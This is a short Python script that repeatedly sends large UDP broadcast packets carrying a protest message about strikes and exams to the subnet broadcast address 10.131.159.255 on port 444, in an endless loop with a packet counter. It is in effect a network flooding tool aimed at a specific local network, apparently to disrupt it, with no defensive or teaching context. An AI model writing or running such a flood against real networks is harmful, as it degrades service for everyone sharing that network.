from socket import *
count = 0

while(True):
	cs = socket(AF_INET, SOCK_DGRAM)
	cs.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	cs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
	MESSAGE = "STRIKES HURT KIDS, ESPECIALLY WHEN THEY\'RE A WEEK BEFORE EXAMS"  * 1000
	cs.sendto(bytes(MESSAGE, 'utf-8'), ('10.131.159.255', 444))
	count += 1
	print("[" + str(count) + "] packets sent")
